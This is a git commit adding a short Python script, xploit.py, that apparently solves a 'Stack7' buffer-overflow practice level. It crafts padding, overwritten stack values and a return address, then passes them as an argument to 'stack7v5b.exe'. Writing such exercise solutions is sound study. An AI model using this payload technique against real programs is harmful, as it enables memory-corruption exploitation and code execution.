936b4796c3f76c63dc9cc90b510d32c4809ba76a
emilianocanedo <emilianocanedo@gmail.com>
2016-07-14 17:02:01 -0300

    Stack7 :D

---
+++ Stack7/xploit.py
@@ -0,0 +1,12 @@
+import subprocess
+
+var_14 = '\x70\x10\x10\x10'
+var_10 = 'xxxx'
+size = 'xxxx'
+var_8 = 'xxxx'
+var_4 = '\x53\x5A\x88\x71'
+s = '\x70\x10\x10\x10'
+r = '\x4B\x11\x10\x10'
+arg_0 = '\x21\x30\x10\x10'
+args = 'stack7v5b.exe ' + 8 * 'x' + '\x49' + 43 * 'x' + var_14 + var_10 + size + var_8 + var_4 + s + r + arg_0 + ' ' + 'YYOUWINMAN'
+subprocess.call(args)
